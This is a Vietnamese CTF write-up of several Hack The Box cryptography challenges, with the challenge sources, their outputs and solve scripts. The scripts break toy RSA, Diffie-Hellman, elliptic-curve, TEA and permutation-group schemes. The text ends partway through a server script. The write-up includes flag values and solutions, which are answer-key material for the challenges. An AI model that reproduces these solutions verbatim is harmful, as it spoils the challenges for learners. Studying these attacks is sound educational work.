Tables of contents
------------------

### I. Crypto

### 1. Dynastic

---

**_SOURCE:_**
```py
from secret import FLAG
from random import randint
def to_identity_map(a):
    return ord(a) - 0x41
def from_identity_map(a):
    return chr(a % 26 + 0x41)
def encrypt(m):
    c = ''
    for i in range(len(m)):
        ch = m[i]
        if not ch.isalpha():
            ech = ch
        else:
            chi = to_identity_map(ch)
            ech = from_identity_map(chi + i)
        c += ech
    return c
with open('output.txt', 'w') as f:
    f.write('Make sure you wrap the decrypted text with the HTB flag format :-]\n')
    f.write(encrypt(FLAG))
```

**_OUTPUT:_**

```py
Make sure you wrap the decrypted text with the HTB flag format :-]
DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL
```

---

Bài này khá dễ. Tóm tắt đề như sau: Lấy lần lượt từng ký tự của txt chuyển sang số nếu m không phải là ký tự thì in nó ra, nếu nó là ký tự thì $(m - 0x41 + stt) % 26 + 0x41$. Từ đó ta chỉ cần code ngược lại là được. Thật ra là chatGPT.

```py
enc = "DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL"
def to_identity_map(a):
    return ord(a) + 0x41
def from_identity_map(a):
    return chr((a - 0x41) % 26 )
m = ''
for i in range(len(enc)):
    ch = enc[i]
    if not ch.isalpha():
        ech = ch
    else:
        chi = from_identity_map(ord(ch) - i)
        ech = chr(to_identity_map(chi))
        
    m += ech
print(m)
```

### 2. Makeshift

---

**_OUTPUT:_**

```py
!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB
```
---

Khi nhìn vào nó mình nhận thấy đây là mã hóa hoán đổi các vị trí của flag nên bây giờ mình cần tìm lại vị trí của nó. Thấy flag_form là HTB{} mà trong enc ta thấy chữ HTb ở cuối nên ta viết ngược nó lại rồi hoán đổi vị trí của chữ lại như ban đầu.

```py
enc: str = "!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB"
enc = enc[::-1]
for x in range(0, len(enc), 3):
    print(enc[x + 1], end= "")
    print(enc[x + 2], end= "")
    print(enc[x ], end= "")
```

### 3. PrimaryKnowledge

---

**_SOURCE:_**
```py
import math
from Crypto.Util.number import getPrime, bytes_to_long
from secret import FLAG
m = bytes_to_long(FLAG)
n = math.prod([getPrime(1024) for _ in range(2**0)])
e = 0x10001
c = pow(m, e, n)
with open('output.txt', 'w') as f:
    f.write(f'{n = }\n')
    f.write(f'{e = }\n')
    f.write(f'{c = }\n')
```

**_OUTPUT:_**

```py
n = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347
e = 65537
c = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215
```
---
Thấy hàm `n = math.prod([getPrime(1024) for _ in range(2**0)])` tạo ra số n là số prime nên ta hoàn toàntoàn có thể dễ dàng tìm phi và từ đó có flag.
```py
def main() -> None:
    n: int = 144595784022187052238125262458232959109987136704231245881870735843030914418780422519197073054193003090872912033596512666042758783502695953159051463566278382720140120749528617388336646147072604310690631290350467553484062369903150007357049541933018919332888376075574412714397536728967816658337874664379646535347
    e: int = 65537
    c: int = 15114190905253542247495696649766224943647565245575793033722173362381895081574269185793855569028304967185492350704248662115269163914175084627211079781200695659317523835901228170250632843476020488370822347715086086989906717932813405479321939826364601353394090531331666739056025477042690259429336665430591623215
    print(long_to_bytes(pow(c, pow(e, -1, n - 1), n)))
if __name__ == "__main__":
    main()
```

### 4. Blunt

---

**_SOURCE:_**
```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import getPrime, long_to_bytes
from hashlib import sha256
from secret import FLAG
import random
p = getPrime(32)
print(f'p = 0x{p:x}')
g = random.randint(1, p-1)
print(f'g = 0x{g:x}')
a = random.randint(1, p-1)
b = random.randint(1, p-1)
A, B = pow(g, a, p), pow(g, b, p)
print(f'A = 0x{A:x}')
print(f'B = 0x{B:x}')
C = pow(A, b, p)
assert C == pow(B, a, p)
# now use it as shared secret
hash = sha256()
hash.update(long_to_bytes(C))
key = hash.digest()[:16]
iv = b'\xc1V2\xe7\xed\xc7@8\xf9\\\xef\x80\xd7\x80L*'
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(FLAG, 16))
print(f'ciphertext = {encrypted}')
```


**_OUTPUT:_**

```py

p = 0xdd6cc28d
g = 0x83e21c05
A = 0xcfabb6dd
B = 0xc4a21ba9
ciphertext = b'\x94\x99\x01\xd1\xad\x95\xe0\x13\xb3\xacZj{\x97|z\x1a(&\xe8\x01\xe4Y\x08\xc4\xbeN\xcd\xb2*\xe6{'
```
---

Đây là một bài sử dụng Diffie-Hellman ECC điển hình ta thấy số p rất nhỏ và nó cũng là số smoothprime nên ta hoàn toàn có thể dùng hàm có sẵn của thư viện để tìm discrete_log và tìm lại secret

```py

from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
from hashlib import sha256
from sympy.ntheory.residue_ntheory import discrete_log
p = 0xdd6cc28d
g = 0x83e21c05
A = 0xcfabb6dd
B = 0xc4a21ba9
ciphertext = b'\x94\x99\x01\xd1\xad\x95\xe0\x13\xb3\xacZj{\x97|z\x1a(&\xe8\x01\xe4Y\x08\xc4\xbeN\xcd\xb2*\xe6{'
a = discrete_log(p, A, g)
secret = pow(B, a, p)
hash = sha256()
hash.update(long_to_bytes(secret))
key = hash.digest()[:16]
iv = b'\xc1V2\xe7\xed\xc7@8\xf9\\\xef\x80\xd7\x80L*'
cipher = AES.new(key, AES.MODE_CBC, iv)
print(f'{cipher.decrypt(ciphertext) = }')
```

### 5. Trà đá

---
**_SOURCE:_**

```py
import os
from secret import FLAG
from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from enum import Enum
class Mode(Enum):
    ECB = 0x01
    CBC = 0x02
class Cipher:
    def __init__(self, key, iv=None):
        self.BLOCK_SIZE = 64
        self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)]
        self.DELTA = 0x9e3779b9
        self.IV = iv
        if self.IV:
            self.mode = Mode.CBC
        else:
            self.mode = Mode.ECB
    
    def _xor(self, a, b):
        return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b))
    def encrypt(self, msg):
        msg = pad(msg, self.BLOCK_SIZE//8)
        blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)]
        
        ct = b''
        if self.mode == Mode.ECB:
            for pt in blocks:
                ct += self.encrypt_block(pt)
        elif self.mode == Mode.CBC:
            X = self.IV
            for pt in blocks:
                enc_block = self.encrypt_block(self._xor(X, pt))
                ct += enc_block
                X = enc_block
        return ct
    def encrypt_block(self, msg):
        m0 = b2l(msg[:4])
        m1 = b2l(msg[4:])
        K = self.KEY
        msk = (1 << (self.BLOCK_SIZE//2)) - 1
        s = 0
        for i in range(32):
            s += self.DELTA
            m0 += ((m1 << 4) + K[0]) ^ (m1 + s) ^ ((m1 >> 5) + K[1])
            m0 &= msk
            m1 += ((m0 << 4) + K[2]) ^ (m0 + s) ^ ((m0 >> 5) + K[3])
            m1 &= msk
        
        m = ((m0 << (self.BLOCK_SIZE//2)) + m1) & ((1 << self.BLOCK_SIZE) - 1) # m = m0 || m1
        return l2b(m)
if __name__ == '__main__':
    KEY = os.urandom(16)
    cipher = Cipher(KEY)
    ct = cipher.encrypt(FLAG)
    with open('output.txt', 'w') as f:
        f.write(f'Key : {KEY.hex()}\nCiphertext : {ct.hex()}')
```

**_OUTPUT:_**

```py
Key : 850c1413787c389e0b34437a6828a1b2
Ciphertext : b36c62d96d9daaa90634242e1e6c76556d020de35f7a3b248ed71351cc3f3da97d4d8fd0ebc5c06a655eb57f2b250dcb2b39c8b2000297f635ce4a44110ec66596c50624d6ab582b2fd92228a21ad9eece4729e589aba644393f57736a0b870308ff00d778214f238056b8cf5721a843
```

---

Bài này mình sử dụng chatgpt để làm vì nó khá là tốn thời gian :) Why not?
```py
from Crypto.Util.Padding import unpad
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from enum import Enum
class Mode(Enum):
    ECB = 0x01
    CBC = 0x02
class Cipher:
    def __init__(self, key, iv=None):
        self.BLOCK_SIZE = 64
        self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)]
        self.DELTA = 0x9e3779b9
        self.IV = iv
        if self.IV:
            self.mode = Mode.CBC
        else:
            self.mode = Mode.ECB
    
    def _xor(self, a, b):
        return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b))
    def decrypt(self, ct):
        blocks = [ct[i:i+self.BLOCK_SIZE//8] for i in range(0, len(ct), self.BLOCK_SIZE//8)]
        
        pt = b''
        if self.mode == Mode.ECB:
            for block in blocks:
                pt += self.decrypt_block(block)
        elif self.mode == Mode.CBC:
            X = self.IV
            for block in blocks:
                decrypted_block = self.decrypt_block(block)
                pt += self._xor(decrypted_block, X)
                X = block
        return unpad(pt, self.BLOCK_SIZE//8)
    def decrypt_block(self, ct):
        c = b2l(ct)
        msk = (1 << (self.BLOCK_SIZE//2)) - 1
        m0 = c >> (self.BLOCK_SIZE//2)
        m1 = c & msk
        K = self.KEY
        s = (self.DELTA << 5)
        for i in range(32):
            m1 -= ((m0 << 4) + K[2]) ^ (m0 + s) ^ ((m0 >> 5) + K[3])
            m1 &= msk
            m0 -= ((m1 << 4) + K[0]) ^ (m1 + s) ^ ((m1 >> 5) + K[1])
            m0 &= msk
            s -= self.DELTA
        
        return l2b((m0 << 32) + m1)
if __name__ == '__main__':
    with open('crypto_iced_tea/output.txt', 'r') as f:
        data = f.read().split('\n')
        KEY = bytes.fromhex(data[0].split(': ')[1])
        ct = bytes.fromhex(data[1].split(': ')[1])
    cipher = Cipher(KEY)
    pt = cipher.decrypt(ct)
    print("Decrypted Flag:", pt.decode())
```

### 6. Arranged

---
**_SOURCE:_**
```sage
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import long_to_bytes
from hashlib import sha256
from secret import FLAG, p, b, priv_a, priv_b
F = GF(p)
E = EllipticCurve(F, [726, b])
G = E(926644437000604217447316655857202297402572559368538978912888106419470011487878351667380679323664062362524967242819810112524880301882054682462685841995367, 4856802955780604241403155772782614224057462426619061437325274365157616489963087648882578621484232159439344263863246191729458550632500259702851115715803253)
A = G * priv_a
B = G * priv_b
print(A)
print(B)
C = priv_a * B
assert C == priv_b * A
# now use it as shared secret
secret = C[0]
hash = sha256()
hash.update(long_to_bytes(secret))
key = hash.digest()[16:32]
iv = b'u\x8fo\x9aK\xc5\x17\xa7>[\x18\xa3\xc5\x11\x9en'
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(FLAG, 16))
print(encrypted)
```
**_OUTPUT:_**
```py
(6174416269259286934151093673164493189253884617479643341333149124572806980379124586263533252636111274525178176274923169261099721987218035121599399265706997 : 2456156841357590320251214761807569562271603953403894230401577941817844043774935363309919542532110972731996540328492565967313383895865130190496346350907696 : 1)
(4226762176873291628054959228555764767094892520498623417484902164747532571129516149589498324130156426781285021938363575037142149243496535991590582169062734 : 425803237362195796450773819823046131597391930883675502922975433050925120921590881749610863732987162129269250945941632435026800264517318677407220354869865 : 1)
b'V\x1b\xc6&\x04Z\xb0c\xec\x1a\tn\xd9\xa6(\xc1\xe1\xc5I\xf5\x1c\xd3\xa7\xdd\xa0\x84j\x9bob\x9d"\xd8\xf7\x98?^\x9dA{\xde\x08\x8f\x84i\xbf\x1f\xab'
```
---

Bài này yêu cầu ta phải tìm hidden_curve trong khi ta biết a và phải tìm b, p. Ta có:

+ ECC có dạng $y ^ 2 = x ^ 3 + a * x + b \pmod{p}$
  
nên $y ^ 2 - ( x ^ 3 + a * x) = b \pmod{p}$

Do ta có 3 điểm thuộc đường "cong" là A, B, G nên từ đó ta có thể tìm được 3 giá trị của b thỏa mãn điều kiện sau:

$$b_0 = b_1 = b_2 \pmod{p} \to b_0 - b1 = 0 = b_0 - b_2 \pmod{p}$$

Giả sử: $b_0 - b_1 = k * p$ và $b_0 - b_2 = u * p$ thì ta dễ thấy $p = GCD(b_0 - b_1, b_0 - b_2)$ sau khi có p ta có thể tìm b một cách dễ dàng:B

Còn phần sau thì mình sử dụng hàm discrete_log của sage vì đây là số smoothprime và từ đó dễ dàng có được flag.
```sage
from Crypto.Cipher import AES
from Crypto.Util.number import *
from hashlib import sha256
def main():
    a: int = 726
    G: tuple = (926644437000604217447316655857202297402572559368538978912888106419470011487878351667380679323664062362524967242819810112524880301882054682462685841995367, 4856802955780604241403155772782614224057462426619061437325274365157616489963087648882578621484232159439344263863246191729458550632500259702851115715803253)
    A: tuple = (6174416269259286934151093673164493189253884617479643341333149124572806980379124586263533252636111274525178176274923169261099721987218035121599399265706997, 2456156841357590320251214761807569562271603953403894230401577941817844043774935363309919542532110972731996540328492565967313383895865130190496346350907696)
    B: tuple = (4226762176873291628054959228555764767094892520498623417484902164747532571129516149589498324130156426781285021938363575037142149243496535991590582169062734, 425803237362195796450773819823046131597391930883675502922975433050925120921590881749610863732987162129269250945941632435026800264517318677407220354869865)
    enc: bytes = b'V\x1b\xc6&\x04Z\xb0c\xec\x1a\tn\xd9\xa6(\xc1\xe1\xc5I\xf5\x1c\xd3\xa7\xdd\xa0\x84j\x9bob\x9d"\xd8\xf7\x98?^\x9dA{\xde\x08\x8f\x84i\xbf\x1f\xab'
    b_0 = G[1] ^ 2 - (G[0] ^ 3 + a * G[0])
    b_1 = A[1] ^ 2 - (A[0] ^ 3 + a * A[0])
    b_2 = B[1] ^ 2 - (B[0] ^ 3 + a * B[0])
    p = gcd(b_0 - b_1, b_0 - b_2)
    b = b_0 % p
    
    E = EllipticCurve(GF(p), [a, b])
    G = E(G)
    A = E(A)
    B = E(B)
    print(f"{p = }")
    print(f"{b = }")
    # b = discrete_log(B, G, operation='+')
    b = 8
    secret = A * b
    secret = secret[0]
    hash = sha256()
    hash.update(long_to_bytes(int(secret)))
    key = hash.digest()[16:32]
    iv = b'u\x8fo\x9aK\xc5\x17\xa7>[\x18\xa3\xc5\x11\x9en'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    print(f"{cipher.decrypt(enc) = }")
if __name__ == '__main__':
    main()
```

### 7. partial tenacity

---

**_SOURCE:_**

```py
from secret import FLAG
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
class RSACipher:
    def __init__(self, bits):
        self.key = RSA.generate(bits)
        self.cipher = PKCS1_OAEP.new(self.key)
    
    def encrypt(self, m):
        return self.cipher.encrypt(m)
    def decrypt(self, c):
        return self.cipher.decrypt(c)
cipher = RSACipher(1024)
enc_flag = cipher.encrypt(FLAG)
with open('output.txt', 'w') as f:
    f.write(f'n = {cipher.key.n}\n')
    f.write(f'ct = {enc_flag.hex()}\n')
    f.write(f'p = {str(cipher.key.p)[::2]}\n')
    f.write(f'q = {str(cipher.key.q)[1::2]}')
```

**_OUTPUT:_**

```py
n = 118641897764566817417551054135914458085151243893181692085585606712347004549784923154978949512746946759125187896834583143236980760760749398862405478042140850200893707709475167551056980474794729592748211827841494511437980466936302569013868048998752111754493558258605042130232239629213049847684412075111663446003
ct = 7f33a035c6390508cee1d0277f4712bf01a01a46677233f16387fae072d07bdee4f535b0bd66efa4f2475dc8515696cbc4bc2280c20c93726212695d770b0a8295e2bacbd6b59487b329cc36a5516567b948fed368bf02c50a39e6549312dc6badfef84d4e30494e9ef0a47bd97305639c875b16306fcd91146d3d126c1ea476
p = 151441473357136152985216980397525591305875094288738820699069271674022167902643
q = 15624342005774166525024608067426557093567392652723175301615422384508274269305
```
---

Tóm tắt lại đề bài, ta có đây là RSA với mã hóa PKCS1 padding với e = 65537 và ta có phần leak của `p = cipher.key.p)[::2], q = cipher.key.q)[1::2]`.

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/ce082550-71a7-4849-8b82-9c00f4f06381)

[Mình sử dụng tai liệu này](https://eprint.iacr.org/2020/1506.pdf)

Ta dễ thấy với hai số, giả sử xxx * yyy = zzz thì với mọi k ta luôn có kxxx * yyy = ?zzz tức với khi thêm một số vào số hang của phép nhân thì một vài số của tích vẫn không thay đổi :M không hiểu miêu tả kiểu j:

xét:

`x4x3 * 0x5x = 6003` từ đó ta thử brute với mọi x có thể từ '0 -> 9' nên ta thử brute nếu x thỏa mãn thì ta lưu lại (nhưng vì có thể có nhiều x thỏa mãn nên ta lưu nó trong list rồi tách ra thử cách trường hợp khác). Mình sử dụng thuật toán như sau.

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/1688b0eb-d8f6-466c-a186-0fd456f371f6)

đề có thể biết vị trí mình cần brute thì mình tạo ra một str với các số 0, 1 nếu vị trí hiện tại là 1 thì ta bỏ qua không brute, ngược lại nếu là 0 thì ta tiến hành brute dựa trên những điều trên

```py
    p_mask = "".join(["1" if i % 2 == 0 else "0" for i in range(prime_len)])
    q_mask = "".join(["1" if i % 2 == 1 else "0" for i in range(prime_len)])
```
khi đó ta sử dụng hàm như sau để tìm giá trị cần tìm:
```py
def brute_int(i: int, n: int, know_prime: int, prime_check: int, hint_prime: int) -> list:
    know_prime = (hint_prime % 10) * (10 ** i) + know_prime
    for brute in range(10):
        test = brute * (10 ** i) + prime_check
        if n % (10 ** (i + 1)) == know_prime * test % (10 ** (i + 1)):
            return know_prime, test, hint_prime // 10
```
với hint_prime = p or q leak, knowprime là số mình biết, primecheck là số ta muốn brute
và từ đó ta brute lần lượt từng phần tử của p,q thỏa mãn:
```py
def brute_prime(n: int, p: int, q: int, p_h: int, q_h: int, p_mask: str, q_mask: str) -> int:
    for i in range(len(p_mask)):
        if p_mask[- (i + 1)] == "1":
            p, q, p_h = brute_int(i, n, p, q, p_h)
            
        else:
            q, p, q_h = brute_int(i, n, q, p, q_h)
    assert p * q == n
    return p, q
```

Từ đó ta có thể tìm lại được flag và hoàn thành chall.

```py
from Crypto.Util.number import *
from gmpy2 import iroot
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
def brute_int(i: int, n: int, know_prime: int, prime_check: int, hint_prime: int) -> list:
    know_prime = (hint_prime % 10) * (10 ** i) + know_prime
    for brute in range(10):
        test = brute * (10 ** i) + prime_check
        if n % (10 ** (i + 1)) == know_prime * test % (10 ** (i + 1)):
            return know_prime, test, hint_prime // 10
def brute_prime(n: int, p: int, q: int, p_h: int, q_h: int, p_mask: str, q_mask: str) -> int:
    for i in range(len(p_mask)):
        if p_mask[- (i + 1)] == "1":
            p, q, p_h = brute_int(i, n, p, q, p_h)
            
        else:
            q, p, q_h = brute_int(i, n, q, p, q_h)
    assert p * q == n
    return p, q
def main() -> None:
    n: int = 118641897764566817417551054135914458085151243893181692085585606712347004549784923154978949512746946759125187896834583143236980760760749398862405478042140850200893707709475167551056980474794729592748211827841494511437980466936302569013868048998752111754493558258605042130232239629213049847684412075111663446003
    ct: bytes = bytes.fromhex("7f33a035c6390508cee1d0277f4712bf01a01a46677233f16387fae072d07bdee4f535b0bd66efa4f2475dc8515696cbc4bc2280c20c93726212695d770b0a8295e2bacbd6b59487b329cc36a5516567b948fed368bf02c50a39e6549312dc6badfef84d4e30494e9ef0a47bd97305639c875b16306fcd91146d3d126c1ea476")
    p_h: int = 151441473357136152985216980397525591305875094288738820699069271674022167902643
    q_h: int = 15624342005774166525024608067426557093567392652723175301615422384508274269305
    e: int = 65537
    prime_len = len(str(int(iroot(n, 2)[0])))
    
    p_mask = "".join(["1" if i % 2 == 0 else "0" for i in range(prime_len)])
    q_mask = "".join(["1" if i % 2 == 1 else "0" for i in range(prime_len)])
    p, q = brute_prime(n, 0, 0, p_h, q_h, p_mask, q_mask)
    print(p, q)
    key = RSA.RsaKey(n = n, e = e, d = pow(65537, -1, (p - 1) * (q - 1)), p = p, q = q, u = pow(p, -1, q))
    cipher = PKCS1_OAEP.new(key)
    print(cipher.decrypt(ct))
if __name__ == "__main__":
    main()
```

### 8. Permulted

---

**_SOURCE:_**
```py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import long_to_bytes
from hashlib import sha256
from random import shuffle
from secret import a, b, FLAG
class Permutation:
    def __init__(self, mapping):
        self.length = len(mapping)
        assert set(mapping) == set(range(self.length))     # ensure it contains all numbers from 0 to length-1, with no repetitions
        self.mapping = list(mapping)
    def __call__(self, *args, **kwargs):
        idx, *_ = args
        assert idx in range(self.length)
        return self.mapping[idx]
    def __mul__(self, other):
        ans = []
        for i in range(self.length):
            ans.append(self(other(i)))
        return Permutation(ans)
    def __pow__(self, power, modulo=None):
        ans = Permutation.identity(self.length)
        ctr = self
        while power > 0:
            if power % 2 == 1:
                ans *= ctr
            ctr *= ctr
            power //= 2
        return ans
    def __str__(self):
        return str(self.mapping)
    def identity(length):
        return Permutation(range(length))
x = list(range(50_000))
shuffle(x)
g = Permutation(x)
print('g =', g)
A = g**a
print('A =', A)
B = g**b
print('B =', B)
C = A**b
assert C.mapping == (B**a).mapping
sec = tuple(C.mapping)
sec = hash(sec)
sec = long_to_bytes(sec)
hash = sha256()
hash.update(sec)
key = hash.digest()[16:32]
iv = b"mg'g\xce\x08\xdbYN2\x89\xad\xedlY\xb9"
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(FLAG, 16))
print('c =', encrypted)
```
**_OUTPUT:_**

file nặng quá nên k cho vào dc

---

Trong đoạn script trên ta có một class là Permultation , là một cấu trúc đại số được ký hiệu như sau $M = (x_1, x_2, ... x_n)$ hay

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/0e8a7d6e-741f-4159-be64-b647b602b23d)

với :

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/4a43437b-5d35-4e3a-b790-c9bd03a7529a)

thì ta có p(1) = 2, p(2) = 3, p(3) = 1. Thấy đây là một nhóm hoán vị thuộc $S_3$ , mà tập hợp các đầu vào có thể của một nhóm hoán vị $S_n$ là n.

Trong python, nhóm hoán vị được biểu diễn theo dạng ma trận với

```py
def __init__(self, mapping):
    self.length = len(mapping)
    assert set(mapping) == set(range(self.length))     # ensure it contains all numbers from 0 to length-1, with no repetitions
    self.mapping = list(mapping)
```
một một phần tử có độ dài xác định và không giới hạn, mỗi một phần tử cũng được yêu cầu là một tập hợp của các số trong khoảng từ 0 đến length - 1 của phần tử đó. 
```py
def __call__(self, *args, **kwargs):
	idx, *_ = args
    assert idx in range(self.length)
    return self.mapping[idx]
```

hàm call sẽ trả lại giá trị tại index mà chúng ta nhập vào.

```py
p = Permutation([2, 3, 1])
print(p(2))		# outputs 1
```
```py
def __mul__(self, other):
    ans = []
    for i in range(self.length):
        ans.append(self(other(i)))
    return Permutation(ans)
```
với hàm mul để hiểu được nó ta cần nói qua về nhóm hoán vị để có thể hiểu được nó.

+ ta có i = [0, 1, 2, ..., n - 1] là phần tử đơn vị vì dễ thấy hoán vị của chính nó luôn bằng chính nó
+ với phép nhân được quy ước như sau $p * q = p(q(x)) \forall x \in [0, 1, .., length - 1]$ với điều kiện hai phần tử có độ dài bằng nhau.
+ Theo định nghĩa cơ bản của hoán vị thì nó là một song ánh tức nó luôn tồn tại một nghịch đảo của nó.
+ Vì thành phần hàm hoán vị có tính kết hợp nên ta có a(b * c) = a * b * c. Do đó, tích của hai hoán vị trở lên thường được viết mà không thêm dấu ngoặc đơn để biểu thị việc phân nhóm; chúng cũng thường được viết mà không có dấu chấm hoặc dấu hiệu khác để biểu thị phép nhân
Nên đầy hoàn toàn là một nhóm (không có tính chất hoán vị)

ví dụ:

```py
p = Permutation([2, 3, 1])
q = Permutation([3, 2, 1])
comp = p * q
print(comp.mapping)		# [1, 3, 2]
```

ta có $com = [p(q(x)) \forall x \in [0, 1, ..., length - 1]] =[p(q(1)), p(q(2)), p(q(3))] = [p(3), p(2), p(1)] = [1, 3, 2]$

cuối cùng là hàm mũ sử dụng thuật toán double and add để giảm thời gian tính toán và theo như lý thyết ở trên $p ^ n = p * p * ... * p$ từ đó ta hoàn toàn có thể tính toán được hàm mũ.

```py
def __pow__(self, power, modulo=None):
    ans = Permutation.identity(self.length)
    ctr = self
    while power > 0:
        if power % 2 == 1:
            ans *= ctr
        ctr *= ctr
        power //= 2

    return ans
```

Còn lại thì nó là bài toán Diffie-Hellman ta phải đì tìm $log_a(a) \pmod{p}$ từ đó ta phải tìm cấp của g trong nhóm và nếu g là số smooth prime thì ta sẽ dùng hàm của sage để giải.

```sage


g = PermutationGroupElement(Permutation([i+1 for i in g]))
A = PermutationGroupElement(Permutation([i+1 for i in A]))
B = PermutationGroupElement(Permutation([i+1 for i in B]))

o = g.order()
```

ta gọi A, B, G là phần tử của nhóm hoán vị (các giá trị của A, B, G được cộng 1 vì trong sage chỉ số nhóm hoán vị bắt đầu từ 1, pt bắt đầu từ 0) từ đó ta có thể tìm ra cấp của g = 3311019189498977856900

![image](https://github.com/MinhFanBoy/CTF/assets/145200520/27756d54-6aa1-445d-898a-321a7a191207)

từ đó ta có thể sử dụng polig hellman để có tính a, b và hoành thành chall.

```sage

g = PermutationGroupElement(Permutation([i+1 for i in g]))
A = PermutationGroupElement(Permutation([i+1 for i in A]))
B = PermutationGroupElement(Permutation([i+1 for i in B]))

o = g.order()
print(o)
a = []
b = []
for p,e in factor(o):
    tg = g^(ZZ(o/p^e))
    tA = A^(ZZ(o/p^e))
    tB = B^(ZZ(o/p^e))
    for i in range(p^e):
        if tg^i==tA:
            a.append([i,p^e])
    for i in range(p^e):
        if tg^i==tB:
            b.append([i,p^e])
a = crt([i[0] for i in a],[i[1] for i in a])
b = crt([i[0] for i in b],[i[1] for i in b])
assert g^a == A
assert g^b == B
print(f'{a = }')
print(f'{b = }')
```

```py

c = b'\x89\xba1J\x9c\xfd\xe8\xd0\xe5A*\xa0\rq?!wg\xb0\x85\xeb\xce\x9f\x06\xcbG\x84O\xed\xdb\xcd\xc2\x188\x0cT\xa0\xaaH\x0c\x9e9\xe7\x9d@R\x9b\xbd'

a = 839949590738986464
b = 828039274502849303

A = Permutation(A)
g = Permutation(g)
B = Permutation(B)

A = g ** a
C = A ** b

sec = tuple(C.mapping)
sec = hash(sec)
sec = long_to_bytes(sec)

hash = sha256()
hash.update(sec)

key = hash.digest()[16:32]
iv = b"mg'g\xce\x08\xdbYN2\x89\xad\xedlY\xb9"

cipher = AES.new(key, AES.MODE_CBC, iv)

encrypted = cipher.decrypt(c)
print('d =', encrypted)

```

### 9. tsayaki

---

**_secret.py_**
```py
IV = b'\r\xdd\xd2w<\xf4\xb9\x08'
FLAG = 'HTB{th1s_4tt4ck_m4k3s_T34_1n4ppr0pr14t3_f0r_h4sh1ng!}'
```

**_tea.py_**
```py
from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long as b2l, long_to_bytes as l2b
from enum import Enum

class Mode(Enum):
    ECB = 0x01
    CBC = 0x02

class Cipher:
    def __init__(self, key, iv=None):
        self.BLOCK_SIZE = 64
        self.KEY = [b2l(key[i:i+self.BLOCK_SIZE//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)]
        self.DELTA = 0x9e3779b9
        self.IV = iv
        if self.IV:
            self.mode = Mode.CBC
        else:
            self.mode = Mode.ECB
    
    def _xor(self, a, b):
        return b''.join(bytes([_a ^ _b]) for _a, _b in zip(a, b))

    def encrypt(self, msg):
        msg = pad(msg, self.BLOCK_SIZE//8)
        blocks = [msg[i:i+self.BLOCK_SIZE//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)]
        
        ct = b''
        if self.mode == Mode.ECB:
            for pt in blocks:
                ct += self.encrypt_block(pt)
        elif self.mode == Mode.CBC:
            X = self.IV
            for pt in blocks:
                enc_block = self.encrypt_block(self._xor(X, pt))
                ct += enc_block
                X = enc_block
        return ct

    def encrypt_block(self, msg):
        m0 = b2l(msg[:4])
        m1 = b2l(msg[4:])
        K = self.KEY
        msk = (1 << (self.BLOCK_SIZE//2)) - 1

        s = 0
        for i in range(32):
            s += self.DELTA
            m0 += ((m1 << 4) + K[0]) ^ (m1 + s) ^ ((m1 >> 5) + K[1])
            m0 &= msk
            m1 += ((m0 << 4) + K[2]) ^ (m0 + s) ^ ((m0 >> 5) + K[3])
            m1 &= msk
        
        m = ((m0 << (self.BLOCK_SIZE//2)) + m1) & ((1 << self.BLOCK_SIZE) - 1) # m = m0 || m1

        return l2b(m)
```

**_server.py_**
```py
from tea import Cipher as TEA
from secret import IV, FLAG
import os

ROUNDS = 10

def show_menu():
    print("""
============================================================================================
|| I made this decryption oracle in which I let users choose their own decryption keys.   ||
|| I think that it's secure as the tea cipher doesn't produce collisions (?) ... Right?   ||
|| If you manage to prove me wrong 10 times, you get a special gift.                      ||
============================================================================================
""")

def run():
    show_menu()

    server_message = os.urandom(20)
    print(f'Here is my special message: {server_message.hex()}')
    
    used_keys = []
    ciphertexts = []
    for i in range(ROUNDS):
        print(f'Round {i+1}/10')
        try:
            ct = bytes.fromhex(input('Enter your target ciphertext (in hex) : '))
            assert ct not in ciphertexts

            for j in range(4):
                key = bytes.fromhex(input(f'[{i+1}/{j+1}] Enter your encryption key (in hex) : '))
                assert len(key) == 16 and key not in used_keys
                used_keys.append(key)
                cipher = TEA(key, IV)
                enc = cipher.encrypt(server_message)
                if enc != ct:
                    print(f'Hmm ... close enough, but {enc.hex()} does not look like {ct.hex()} at all! Bye...')
                    exit()
